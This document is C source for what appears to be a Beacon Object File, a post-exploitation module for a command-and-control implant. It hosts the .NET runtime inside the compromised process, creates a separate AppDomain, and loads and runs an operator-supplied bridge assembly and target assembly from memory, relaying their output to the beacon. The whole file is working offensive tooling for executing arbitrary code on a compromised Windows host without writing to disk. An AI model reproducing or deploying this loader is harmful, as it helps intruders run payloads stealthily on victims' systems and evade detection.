#include <windows.h>
#include <oleauto.h>
#include <stdint.h>

#define CALLBACK_OUTPUT 0
#define CALLBACK_ERROR  1

typedef struct {
    char *original;
    char *buffer;
    int length;
    int size;
} datap;

void BeaconOutput(int type, char *data, int len);
void BeaconPrintf(int type, char *fmt, ...);
void BeaconDataParse(datap *parser, char *buffer, int size);
char *BeaconDataExtract(datap *parser, int *size);
int BeaconDataInt(datap *parser);

__declspec(dllimport) HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
__declspec(dllimport) HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
__declspec(dllimport) DWORD WINAPI KERNEL32$GetTickCount(void);
__declspec(dllimport) int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
__declspec(dllimport) int WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
__declspec(dllimport) BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
__declspec(dllimport) HRESULT WINAPI OLE32$CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);
__declspec(dllimport) void WINAPI OLE32$CoUninitialize(void);
__declspec(dllimport) HRESULT WINAPI MSCOREE$CLRCreateInstance(REFCLSID clsid, REFIID riid, LPVOID *ppInterface);
__declspec(dllimport) SAFEARRAY *WINAPI OLEAUT32$SafeArrayCreateVector(VARTYPE vt, LONG lLbound, ULONG cElements);
__declspec(dllimport) HRESULT WINAPI OLEAUT32$SafeArrayDestroy(SAFEARRAY *psa);
__declspec(dllimport) HRESULT WINAPI OLEAUT32$SafeArrayAccessData(SAFEARRAY *psa, void HUGEP **ppvData);
__declspec(dllimport) HRESULT WINAPI OLEAUT32$SafeArrayUnaccessData(SAFEARRAY *psa);
__declspec(dllimport) HRESULT WINAPI OLEAUT32$SafeArrayPutElement(SAFEARRAY *psa, LONG *rgIndices, void *pv);
__declspec(dllimport) BSTR WINAPI OLEAUT32$SysAllocStringLen(const OLECHAR *strIn, UINT ui);
__declspec(dllimport) void WINAPI OLEAUT32$SysFreeString(BSTR bstrString);
__declspec(dllimport) UINT WINAPI OLEAUT32$SysStringLen(BSTR pbstr);
__declspec(dllimport) HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG *pvarg);

static const GUID CLSID_CLRMetaHost = {0x9280188D, 0x0E8E, 0x4867, {0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE}};
static const GUID IID_ICLRMetaHost = {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
static const GUID IID_ICLRRuntimeInfo = {0xBD39D1D2, 0xBA2F, 0x486A, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
static const GUID CLSID_CorRuntimeHost = {0xCB2F6723, 0xAB3A, 0x11D2, {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}};
static const GUID IID_ICorRuntimeHost = {0xCB2F6722, 0xAB3A, 0x11D2, {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}};
static const GUID IID_AppDomain = {0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};
static const GUID IID_Assembly = {0x17156360, 0x2F1A, 0x384A, {0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B}};
static const GUID IID_MethodInfo = {0xFFCC1B5D, 0xECB8, 0x38DD, {0x9B, 0x01, 0x3D, 0xC8, 0xAB, 0xC2, 0xAA, 0x5F}};

typedef struct clr_metahost_vtbl_t {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
    ULONG (STDMETHODCALLTYPE *AddRef)(void *);
    ULONG (STDMETHODCALLTYPE *Release)(void *);
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(void *, LPCWSTR, REFIID, LPVOID *);
    void *unused[6];
} clr_metahost_vtbl_t;

typedef struct clr_metahost_t {
    clr_metahost_vtbl_t *lpVtbl;
} clr_metahost_t;

typedef struct clr_runtimeinfo_vtbl_t {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
    ULONG (STDMETHODCALLTYPE *AddRef)(void *);
    ULONG (STDMETHODCALLTYPE *Release)(void *);
    void *unused0[6];
    HRESULT (STDMETHODCALLTYPE *GetInterface)(void *, REFCLSID, REFIID, LPVOID *);
    void *unused1[5];
} clr_runtimeinfo_vtbl_t;

typedef struct clr_runtimeinfo_t {
    clr_runtimeinfo_vtbl_t *lpVtbl;
} clr_runtimeinfo_t;

typedef struct runtime_host_vtbl_t {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
    ULONG (STDMETHODCALLTYPE *AddRef)(void *);
    ULONG (STDMETHODCALLTYPE *Release)(void *);
    void *CreateLogicalThreadState;
    void *DeleteLogicalThreadState;
    void *SwitchInLogicalThreadState;
    void *SwitchOutLogicalThreadState;
    void *LocksHeldByLogicalThread;
    void *MapFile;
    void *GetConfiguration;
    HRESULT (STDMETHODCALLTYPE *Start)(void *);
    void *Stop;
    HRESULT (STDMETHODCALLTYPE *CreateDomain)(void *, LPCWSTR, IUnknown *, IUnknown **);
    HRESULT (STDMETHODCALLTYPE *GetDefaultDomain)(void *, IUnknown **);
    void *EnumDomains;
    void *NextDomain;
    void *CloseEnum;
    void *CreateDomainEx;
    void *CreateDomainSetup;
    void *CreateEvidence;
    HRESULT (STDMETHODCALLTYPE *UnloadDomain)(void *, IUnknown *);
    void *CurrentDomain;
} runtime_host_vtbl_t;

typedef struct runtime_host_t {
    runtime_host_vtbl_t *lpVtbl;
} runtime_host_t;

typedef struct appdomain_vtbl_t {
    void *padding[45];
    HRESULT (STDMETHODCALLTYPE *Load_3)(void *, SAFEARRAY *, IUnknown **);
} appdomain_vtbl_t;

typedef struct appdomain_t {
    appdomain_vtbl_t *lpVtbl;
} appdomain_t;

typedef struct assembly_vtbl_t {
    void *padding[16];
    void *get_EntryPoint;
    HRESULT (STDMETHODCALLTYPE *GetType_2)(void *, BSTR, IUnknown **);
} assembly_vtbl_t;

typedef struct assembly_t {
    assembly_vtbl_t *lpVtbl;
} assembly_t;

typedef struct methodinfo_vtbl_t {
    void *padding[18];
    HRESULT (STDMETHODCALLTYPE *GetParameters)(void *, SAFEARRAY **);
    void *padding_gap[18];
    HRESULT (STDMETHODCALLTYPE *Invoke_3)(void *, VARIANT, SAFEARRAY *, VARIANT *);
} methodinfo_vtbl_t;

typedef struct methodinfo_t {
    methodinfo_vtbl_t *lpVtbl;
} methodinfo_t;

static void mem_zero(void *dst, int n) {
    unsigned char *d = (unsigned char *)dst;
    int i;
    for (i = 0; i < n; i++) d[i] = 0;
}

static void mem_copy(void *dst, const void *src, int n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    int i;
    for (i = 0; i < n; i++) d[i] = s[i];
}

static int str_len(const char *s) {
    int n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static int str_eq_n(const char *a, const char *b, int n) {
    int i;
    if (!a || !b) return 0;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) return 0;
    }
    return 1;
}

static void release_unknown(IUnknown **unk) {
    if (unk && *unk && (*unk)->lpVtbl && (*unk)->lpVtbl->Release) {
        (*unk)->lpVtbl->Release(*unk);
        *unk = NULL;
    }
}

static void append_raw(const char *s, int n) {
    if (s && n > 0) BeaconOutput(CALLBACK_OUTPUT, (char *)s, n);
}

static void append_cstr(const char *s) {
    append_raw(s, str_len(s));
}

static void append_u32(unsigned int v) {
    char tmp[16];
    int pos = 0;
    if (v == 0) {
        append_raw("0", 1);
        return;
    }
    while (v && pos < (int)sizeof(tmp)) {
        tmp[pos++] = (char)('0' + (v % 10));
        v /= 10;
    }
    while (pos > 0) append_raw(&tmp[--pos], 1);
}

static void append_i32(int v) {
    unsigned int u;
    if (v < 0) {
        append_raw("-", 1);
        u = (unsigned int)(-v);
    } else {
        u = (unsigned int)v;
    }
    append_u32(u);
}

static void append_hr(const char *stage, HRESULT hr) {
    static const char hex[] = "0123456789abcdef";
    unsigned int code = (unsigned int)hr;
    int i;
    append_cstr(stage);
    append_raw(" (0x", 4);
    for (i = 7; i >= 0; i--) {
        char c = hex[(code >> (i * 4)) & 0xF];
        append_raw(&c, 1);
    }
    append_raw(")\r\n", 3);
}

static BSTR utf8_to_bstr(const char *data, int len) {
    wchar_t *tmp;
    BSTR out;
    int wlen;
    if (len == 0) return OLEAUT32$SysAllocStringLen(NULL, 0);
    wlen = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, data, len, NULL, 0);
    if (wlen <= 0) return NULL;
    tmp = (wchar_t *)KERNEL32$LocalAlloc(LPTR, ((SIZE_T)wlen + 1) * sizeof(wchar_t));
    if (!tmp) return NULL;
    if (KERNEL32$MultiByteToWideChar(CP_UTF8, 0, data, len, tmp, wlen) != wlen) {
        KERNEL32$LocalFree(tmp);
        return NULL;
    }
    out = OLEAUT32$SysAllocStringLen(tmp, (UINT)wlen);
    KERNEL32$LocalFree(tmp);
    return out;
}

static char *bstr_to_utf8(BSTR bstr) {
    UINT wlen;
    int len;
    char *out;
    if (!bstr) return NULL;
    wlen = OLEAUT32$SysStringLen(bstr);
    if (wlen == 0) {
        out = (char *)KERNEL32$LocalAlloc(LPTR, 1);
        return out;
    }
    len = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, bstr, (int)wlen, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    out = (char *)KERNEL32$LocalAlloc(LPTR, (SIZE_T)len + 1);
    if (!out) return NULL;
    if (KERNEL32$WideCharToMultiByte(CP_UTF8, 0, bstr, (int)wlen, out, len, NULL, NULL) != len) {
        KERNEL32$LocalFree(out);
        return NULL;
    }
    out[len] = 0;
    return out;
}

static HRESULT make_byte_array(const char *data, int len, SAFEARRAY **out) {
    SAFEARRAY *psa;
    void HUGEP *raw = NULL;
    HRESULT hr;
    if (!out || len < 0) return E_INVALIDARG;
    *out = NULL;
    psa = OLEAUT32$SafeArrayCreateVector(VT_UI1, 0, (ULONG)len);
    if (!psa) return E_OUTOFMEMORY;
    if (len > 0) {
        hr = OLEAUT32$SafeArrayAccessData(psa, &raw);
        if (FAILED(hr)) {
            OLEAUT32$SafeArrayDestroy(psa);
            return hr;
        }
        mem_copy(raw, data, len);
        hr = OLEAUT32$SafeArrayUnaccessData(psa);
        if (FAILED(hr)) {
            OLEAUT32$SafeArrayDestroy(psa);
            return hr;
        }
    }
    *out = psa;
    return S_OK;
}

static HRESULT make_string_array(datap *parser, int argc, VARIANT *out) {
    SAFEARRAY *psa;
    int i;
    if (!out || argc < 0) return E_INVALIDARG;
    mem_zero(out, sizeof(*out));
    psa = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, (ULONG)argc);
    if (!psa) return E_OUTOFMEMORY;
    for (i = 0; i < argc; i++) {
        int arg_len = 0;
        LONG idx = (LONG)i;
        char *arg = BeaconDataExtract(parser, &arg_len);
        BSTR b = utf8_to_bstr(arg ? arg : "", arg ? arg_len : 0);
        HRESULT hr;
        if (!b) {
            OLEAUT32$SafeArrayDestroy(psa);
            return E_OUTOFMEMORY;
        }
        hr = OLEAUT32$SafeArrayPutElement(psa, &idx, b);
        OLEAUT32$SysFreeString(b);
        if (FAILED(hr)) {
            OLEAUT32$SafeArrayDestroy(psa);
            return hr;
        }
    }
    out->vt = VT_ARRAY | VT_BSTR;
    out->parray = psa;
    return S_OK;
}

static HRESULT make_execute_params(const char *assembly, int assembly_len, datap *parser, int argc, SAFEARRAY **out) {
    VARIANT asm_var;
    VARIANT args_var;
    VARIANT *items = NULL;
    SAFEARRAY *psa;
    HRESULT hr;
    if (!out) return E_INVALIDARG;
    *out = NULL;
    mem_zero(&asm_var, sizeof(asm_var));
    mem_zero(&args_var, sizeof(args_var));
    hr = make_byte_array(assembly, assembly_len, &asm_var.parray);
    if (FAILED(hr)) return hr;
    asm_var.vt = VT_ARRAY | VT_UI1;
    hr = make_string_array(parser, argc, &args_var);
    if (FAILED(hr)) {
        OLEAUT32$VariantClear(&asm_var);
        return hr;
    }
    psa = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, 2);
    if (!psa) {
        OLEAUT32$VariantClear(&asm_var);
        OLEAUT32$VariantClear(&args_var);
        return E_OUTOFMEMORY;
    }
    hr = OLEAUT32$SafeArrayAccessData(psa, (void HUGEP **)&items);
    if (FAILED(hr)) {
        OLEAUT32$SafeArrayDestroy(psa);
        OLEAUT32$VariantClear(&asm_var);
        OLEAUT32$VariantClear(&args_var);
        return hr;
    }
    items[0] = asm_var;
    items[1] = args_var;
    hr = OLEAUT32$SafeArrayUnaccessData(psa);
    if (FAILED(hr)) {
        OLEAUT32$SafeArrayDestroy(psa);
        return hr;
    }
    *out = psa;
    return S_OK;
}

static HRESULT load_assembly(appdomain_t *domain, const char *data, int len, IUnknown **out) {
    SAFEARRAY *raw = NULL;
    HRESULT hr;
    if (!domain || !domain->lpVtbl || !domain->lpVtbl->Load_3 || !out) return E_INVALIDARG;
    *out = NULL;
    hr = make_byte_array(data, len, &raw);
    if (FAILED(hr)) return hr;
    hr = domain->lpVtbl->Load_3(domain, raw, out);
    OLEAUT32$SafeArrayDestroy(raw);
    return hr;
}

static HRESULT assembly_get_type(assembly_t *assembly, const char *name, IUnknown **out) {
    BSTR b;
    HRESULT hr;
    if (!assembly || !assembly->lpVtbl || !assembly->lpVtbl->GetType_2 || !out) return E_INVALIDARG;
    *out = NULL;
    b = utf8_to_bstr(name, str_len(name));
    if (!b) return E_OUTOFMEMORY;
    hr = assembly->lpVtbl->GetType_2(assembly, b, out);
    OLEAUT32$SysFreeString(b);
    return hr;
}

static HRESULT type_get_method(IUnknown *type_unk, const char *name, IUnknown **out) {
    typedef HRESULT (STDMETHODCALLTYPE *get_method_fn)(void *, BSTR, IUnknown **);
    void **vtbl;
    get_method_fn fn;
    BSTR b;
    HRESULT hr;
    if (!type_unk || !type_unk->lpVtbl || !out) return E_INVALIDARG;
    *out = NULL;
    vtbl = *(void ***)type_unk;
    if (!vtbl) return E_NOINTERFACE;
    fn = (get_method_fn)vtbl[66];
    if (!fn) return E_NOINTERFACE;
    b = utf8_to_bstr(name, str_len(name));
    if (!b) return E_OUTOFMEMORY;
    hr = fn(type_unk, b, out);
    OLEAUT32$SysFreeString(b);
    return hr;
}

static HRESULT invoke_static(methodinfo_t *method, SAFEARRAY *params, VARIANT *ret) {
    VARIANT target;
    if (!method || !method->lpVtbl || !method->lpVtbl->Invoke_3 || !ret) return E_INVALIDARG;
    mem_zero(&target, sizeof(target));
    mem_zero(ret, sizeof(*ret));
    target.vt = VT_EMPTY;
    return method->lpVtbl->Invoke_3(method, target, params, ret);
}

static int parse_i32(const char *s, int n, int *out) {
    int i = 0, neg = 0, v = 0;
    if (!s || !out || n <= 0) return -1;
    if (s[0] == '-') {
        neg = 1;
        i = 1;
    }
    for (; i < n; i++) {
        if (s[i] < '0' || s[i] > '9') return -1;
        v = (v * 10) + (s[i] - '0');
    }
    *out = neg ? -v : v;
    return 0;
}

static char *next_line(char **cursor, int *line_len) {
    char *start;
    char *p;
    if (!cursor || !*cursor || !line_len) return NULL;
    start = *cursor;
    p = start;
    while (*p && *p != '\n') p++;
    *line_len = (int)(p - start);
    if (*line_len > 0 && start[*line_len - 1] == '\r') (*line_len)--;
    *cursor = (*p == '\n') ? p + 1 : p;
    return start;
}

static char *decode_b64_line(char *line, int line_len, int *out_len) {
    char *tmp;
    char *out;
    DWORD need = 0;
    DWORD flags = 0;
    if (out_len) *out_len = 0;
    if (!line || line_len < 0) return NULL;
    tmp = (char *)KERNEL32$LocalAlloc(LPTR, (SIZE_T)line_len + 1);
    if (!tmp) return NULL;
    mem_copy(tmp, line, line_len);
    tmp[line_len] = 0;
    if (!CRYPT32$CryptStringToBinaryA(tmp, 0, 1, NULL, &need, NULL, &flags)) {
        KERNEL32$LocalFree(tmp);
        return NULL;
    }
    out = (char *)KERNEL32$LocalAlloc(LPTR, (SIZE_T)need + 1);
    if (!out) {
        KERNEL32$LocalFree(tmp);
        return NULL;
    }
    if (!CRYPT32$CryptStringToBinaryA(tmp, 0, 1, (BYTE *)out, &need, NULL, &flags)) {
        KERNEL32$LocalFree(out);
        KERNEL32$LocalFree(tmp);
        return NULL;
    }
    out[need] = 0;
    if (out_len) *out_len = (int)need;
    KERNEL32$LocalFree(tmp);
    return out;
}

static void emit_bridge_text(char *text, DWORD duration) {
    char *cur = text;
    char *line;
    int line_len;
    int exit_code = -1;
    char *stdout_text = NULL;
    char *stderr_text = NULL;
    char *exception_text = NULL;
    int stdout_len = 0, stderr_len = 0, exception_len = 0;

    line = next_line(&cur, &line_len);
    if (!line || line_len != 4 || !str_eq_n(line, "BBR1", 4)) {
        append_cstr("[inline-assembly]\r\nExit: -1\r\nDuration: ");
        append_u32(duration);
        append_cstr("ms\r\nTruncated: false\r\n\r\nDIAGNOSTICS:\r\ninvalid bridge response\r\n");
        return;
    }

    line = next_line(&cur, &line_len);
    if (!line || parse_i32(line, line_len, &exit_code) != 0) exit_code = -1;

    line = next_line(&cur, &line_len);
    if (line) stdout_text = decode_b64_line(line, line_len, &stdout_len);
    line = next_line(&cur, &line_len);
    if (line) stderr_text = decode_b64_line(line, line_len, &stderr_len);
    line = next_line(&cur, &line_len);
    if (line) exception_text = decode_b64_line(line, line_len, &exception_len);

    append_cstr("[inline-assembly]\r\nExit: ");
    append_i32(exit_code);
    append_cstr("\r\nDuration: ");
    append_u32(duration);
    append_cstr("ms\r\nTruncated: false\r\n");
    if (stdout_text && stdout_len > 0) {
        append_cstr("\r\nSTDOUT:\r\n");
        append_raw(stdout_text, stdout_len);
        if (stdout_text[stdout_len - 1] != '\n') append_cstr("\r\n");
    }
    if (stderr_text && stderr_len > 0) {
        append_cstr("\r\nSTDERR:\r\n");
        append_raw(stderr_text, stderr_len);
        if (stderr_text[stderr_len - 1] != '\n') append_cstr("\r\n");
    }
    if (exception_text && exception_len > 0) {
        append_cstr("\r\nEXCEPTION:\r\n");
        append_raw(exception_text, exception_len);
        if (exception_text[exception_len - 1] != '\n') append_cstr("\r\n");
    }

    if (stdout_text) KERNEL32$LocalFree(stdout_text);
    if (stderr_text) KERNEL32$LocalFree(stderr_text);
    if (exception_text) KERNEL32$LocalFree(exception_text);
}

static HRESULT query_interface(IUnknown *unk, const GUID *iid, void **out) {
    if (!unk || !unk->lpVtbl || !unk->lpVtbl->QueryInterface || !out) return E_INVALIDARG;
    *out = NULL;
    return unk->lpVtbl->QueryInterface(unk, iid, out);
}

static HRESULT execute_bridge(char *bridge, int bridge_len, char *assembly, int assembly_len, datap *arg_parser, int argc) {
    HRESULT hr;
    clr_metahost_t *meta = NULL;
    clr_runtimeinfo_t *info = NULL;
    runtime_host_t *host = NULL;
    IUnknown *domain_unk = NULL;
    appdomain_t *domain = NULL;
    IUnknown *bridge_asm_unk = NULL;
    assembly_t *bridge_asm = NULL;
    IUnknown *type_unk = NULL;
    IUnknown *method_unk = NULL;
    methodinfo_t *method = NULL;
    SAFEARRAY *params = NULL;
    VARIANT ret;
    DWORD started = KERNEL32$GetTickCount();
    DWORD duration;
    int coinit = 0;
    int domain_can_unload = 0;

    mem_zero(&ret, sizeof(ret));
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        coinit = 1;
    } else if (hr != RPC_E_CHANGED_MODE) {
        append_hr("CoInitializeEx failed", hr);
        return hr;
    }

    hr = MSCOREE$CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (LPVOID *)&meta);
    if (FAILED(hr) || !meta || !meta->lpVtbl || !meta->lpVtbl->GetRuntime) {
        append_hr("CLRCreateInstance failed", FAILED(hr) ? hr : E_NOINTERFACE);
        goto cleanup;
    }

    hr = meta->lpVtbl->GetRuntime(meta, L"v4.0.30319", &IID_ICLRRuntimeInfo, (LPVOID *)&info);
    if (FAILED(hr) || !info || !info->lpVtbl || !info->lpVtbl->GetInterface) {
        append_hr("GetRuntime failed", FAILED(hr) ? hr : E_NOINTERFACE);
        goto cleanup;
    }

    hr = info->lpVtbl->GetInterface(info, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, (LPVOID *)&host);
    if (FAILED(hr) || !host || !host->lpVtbl || !host->lpVtbl->Start) {
        append_hr("GetInterface failed", FAILED(hr) ? hr : E_NOINTERFACE);
        goto cleanup;
    }

    hr = host->lpVtbl->Start(host);
    if (FAILED(hr)) {
        append_hr("CLR Start failed", hr);
        goto cleanup;
    }

    hr = host->lpVtbl->CreateDomain(host, L"TaskContext", NULL, &domain_unk);
    if (FAILED(hr) || !domain_unk) {
        hr = host->lpVtbl->GetDefaultDomain(host, &domain_unk);
    } else {
        domain_can_unload = 1;
    }
    if (FAILED(hr) || !domain_unk) {
        append_hr("AppDomain failed", FAILED(hr) ? hr : E_FAIL);
        goto cleanup;
    }

    hr = query_interface(domain_unk, &IID_AppDomain, (void **)&domain);
    if (FAILED(hr) || !domain) {
        append_hr("_AppDomain QI failed", FAILED(hr) ? hr : E_NOINTERFACE);
        goto cleanup;
    }

    hr = load_assembly(domain, bridge, bridge_len, &bridge_asm_unk);
    if (FAILED(hr) || !bridge_asm_unk) {
        append_hr("Bridge load failed", FAILED(hr) ? hr : E_FAIL);
        goto cleanup;
    }

    hr = query_interface(bridge_asm_unk, &IID_Assembly, (void **)&bridge_asm);
    if (FAILED(hr) || !bridge_asm) {
        append_hr("_Assembly QI failed", FAILED(hr) ? hr : E_NOINTERFACE);
        goto cleanup;
    }

    hr = assembly_get_type(bridge_asm, "InlineRunner", &type_unk);
    if (FAILED(hr) || !type_unk) {
        append_hr("Bridge type lookup failed", FAILED(hr) ? hr : E_FAIL);
        goto cleanup;
    }

    hr = type_get_method(type_unk, "Execute", &method_unk);
    if (FAILED(hr) || !method_unk) {
        append_hr("Bridge method lookup failed", FAILED(hr) ? hr : E_FAIL);
        goto cleanup;
    }

    hr = query_interface(method_unk, &IID_MethodInfo, (void **)&method);
    if (FAILED(hr) || !method) {
        append_hr("_MethodInfo QI failed", FAILED(hr) ? hr : E_NOINTERFACE);
        goto cleanup;
    }

    hr = make_execute_params(assembly, assembly_len, arg_parser, argc, &params);
    if (FAILED(hr)) {
        append_hr("Parameter marshal failed", hr);
        goto cleanup;
    }

    hr = invoke_static(method, params, &ret);
    if (FAILED(hr)) {
        append_hr("Bridge invoke failed", hr);
        goto cleanup;
    }

    if (ret.vt == VT_BSTR && ret.bstrVal) {
        char *text = bstr_to_utf8(ret.bstrVal);
        duration = KERNEL32$GetTickCount() - started;
        if (text) {
            emit_bridge_text(text, duration);
            KERNEL32$LocalFree(text);
        } else {
            append_cstr("[inline-assembly]\r\nExit: -1\r\nDIAGNOSTICS:\r\nresult conversion failed\r\n");
        }
    } else {
        append_cstr("[inline-assembly]\r\nExit: -1\r\nDIAGNOSTICS:\r\nbridge returned non-string result\r\n");
    }

cleanup:
    if (params) OLEAUT32$SafeArrayDestroy(params);
    OLEAUT32$VariantClear(&ret);
    release_unknown((IUnknown **)&method);
    release_unknown(&method_unk);
    release_unknown(&type_unk);
    release_unknown((IUnknown **)&bridge_asm);
    release_unknown(&bridge_asm_unk);
    release_unknown((IUnknown **)&domain);
    if (domain_can_unload && domain_unk && host && host->lpVtbl && host->lpVtbl->UnloadDomain) {
        host->lpVtbl->UnloadDomain(host, domain_unk);
    }
    release_unknown(&domain_unk);
    release_unknown((IUnknown **)&host);
    release_unknown((IUnknown **)&info);
    release_unknown((IUnknown **)&meta);
    if (coinit) OLE32$CoUninitialize();
    return hr;
}

void go(char *args, int len) {
    datap parser;
    char *bridge;
    char *assembly;
    int bridge_len = 0;
    int assembly_len = 0;
    int argc = 0;

    BeaconDataParse(&parser, args, len);
    bridge = BeaconDataExtract(&parser, &bridge_len);
    assembly = BeaconDataExtract(&parser, &assembly_len);
    argc = BeaconDataInt(&parser);

    if (!bridge || bridge_len <= 0 || !assembly || assembly_len <= 0 || argc < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[inline-assembly]\r\nExit: -1\r\nDIAGNOSTICS:\r\ninvalid inline-assembly package");
        return;
    }

    execute_bridge(bridge, bridge_len, assembly, assembly_len, &parser, argc);
}
